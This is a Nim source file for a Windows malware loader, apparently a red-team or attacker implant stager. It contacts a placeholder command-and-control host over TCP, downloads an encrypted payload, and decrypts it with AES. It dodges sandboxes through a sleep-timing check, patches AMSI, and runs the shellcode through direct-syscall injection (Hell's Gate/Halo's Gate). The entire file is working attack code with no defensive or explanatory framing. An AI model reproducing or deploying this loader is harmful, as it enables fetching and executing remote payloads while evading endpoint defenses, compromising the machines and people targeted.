import winim
import winim/lean
import std/strutils
import amsi
import syscalls

# ── Configuration ──────────────────────────────────────────────────────────
const
  c2Host = "C2_HOST"
  c2Port = 443'u16
  c2Path = "/payload.bin"
  scKey  = "DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
  scIV   = "DEADBEEFDEADBEEFDEADBEEFDEADBEEF"

# ── Helpers ────────────────────────────────────────────────────────────────
proc parseHexBytes(s: string): seq[byte] =
  let clean = s.replace(" ", "").replace(",", "").replace("0x", "")
  result = newSeq[byte](clean.len div 2)
  for i in 0 ..< result.len:
    result[i] = byte(parseHexInt(clean[i*2 .. i*2+1]))

proc aesDecrypt(data: var seq[byte]; key, iv: openArray[byte]) =
  var
    hAlg:     BCRYPT_ALG_HANDLE = nil
    hKey:     BCRYPT_KEY_HANDLE = nil
    cbResult: ULONG             = 0
    ivCopy                      = newSeq[byte](iv.len)
  copyMem(addr ivCopy[0], unsafeAddr iv[0], iv.len)

  discard BCryptOpenAlgorithmProvider(addr hAlg, BCRYPT_AES_ALGORITHM, nil, 0)
  var cbcMode = BCRYPT_CHAIN_MODE_CBC
  discard BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                            cast[PUCHAR](addr cbcMode), ULONG(sizeof(cbcMode)), 0)
  discard BCryptGenerateSymmetricKey(hAlg, addr hKey, nil, 0,
                                     cast[PUCHAR](unsafeAddr key[0]), ULONG(key.len), 0)
  discard BCryptDecrypt(hKey,
                        cast[PUCHAR](addr data[0]), ULONG(data.len), nil,
                        cast[PUCHAR](addr ivCopy[0]), ULONG(iv.len),
                        cast[PUCHAR](addr data[0]), ULONG(data.len),
                        addr cbResult, 0)
  BCryptDestroyKey(hKey)
  BCryptCloseAlgorithmProvider(hAlg, 0)
  data.setLen(cbResult.int)

# ── Sandbox evasion: accelerated-time detection ────────────────────────────
proc timingCheck() =
  let t0 = GetTickCount64()
  Sleep(5000)
  if GetTickCount64() - t0 < 4500:
    ExitProcess(0)

# ── Download encrypted shellcode over raw TCP ──────────────────────────────
proc fetchShellcode(): seq[byte] =
  var wsaData: WSADATA
  if WSAStartup(MAKEWORD(2, 2), addr wsaData) != 0:
    ExitProcess(1)

  let sock = socket(AF_INET.cint, SOCK_STREAM.cint, IPPROTO_TCP.cint)
  if sock == INVALID_SOCKET:
    WSACleanup(); ExitProcess(1)

  var serv: sockaddr_in
  serv.sin_family = AF_INET.int16
  serv.sin_port   = htons(c2Port)
  cast[ptr ULONG](addr serv.sin_addr)[] = inet_addr(c2Host)

  if connect(sock, cast[ptr sockaddr](addr serv), sizeof(serv).cint) == SOCKET_ERROR:
    closesocket(sock); WSACleanup(); ExitProcess(1)

  let req = "GET " & c2Path & " HTTP/1.0\r\nHost: " & c2Host & "\r\n\r\n"
  discard send(sock, cstring(req), req.len.cint, 0)

  var raw: seq[byte]
  var buf: array[4096, byte]
  while true:
    let n = recv(sock, cast[cstring](addr buf[0]), buf.len.cint, 0)
    if n <= 0: break
    raw.add(buf.toOpenArray(0, n - 1))

  closesocket(sock)
  WSACleanup()

  var bodyStart = -1
  for i in 0 .. raw.len - 4:
    if raw[i] == 0x0D and raw[i+1] == 0x0A and raw[i+2] == 0x0D and raw[i+3] == 0x0A:
      bodyStart = i + 4
      break
  if bodyStart == -1: ExitProcess(1)
  result = raw[bodyStart .. ^1]

# ── Inject via direct syscalls (Hell's Gate + Halo's Gate) ────────────────
proc injectAndRun(shellcode: var seq[byte]) =
  let sc = initSyscalls()

  var
    base:       PVOID  = nil
    regionSize: SIZE_T = SIZE_T(shellcode.len)
    oldProt:    ULONG  = 0
    tid:        HANDLE = 0

  if sc.NtAllocateVirtualMemory(GetCurrentProcess(), addr base, 0,
                                 addr regionSize,
                                 MEM_COMMIT or MEM_RESERVE,
                                 PAGE_READWRITE) != 0:
    ExitProcess(1)

  copyMem(base, addr shellcode[0], shellcode.len)

  regionSize = SIZE_T(shellcode.len)
  if sc.NtProtectVirtualMemory(GetCurrentProcess(), addr base, addr regionSize,
                                PAGE_EXECUTE_READ, addr oldProt) != 0:
    ExitProcess(1)

  if sc.NtCreateThreadEx(addr tid, ACCESS_MASK(0x1FFFFF), nil,
                          GetCurrentProcess(), base, nil,
                          0, 0, 0, 0, nil) != 0:
    ExitProcess(1)

  discard sc.NtWaitForSingleObject(tid, FALSE, nil)

proc main() =
  timingCheck()
  patchAmsi()

  var sc = fetchShellcode()
  aesDecrypt(sc, parseHexBytes(scKey), parseHexBytes(scIV))
  injectAndRun(sc)

main()
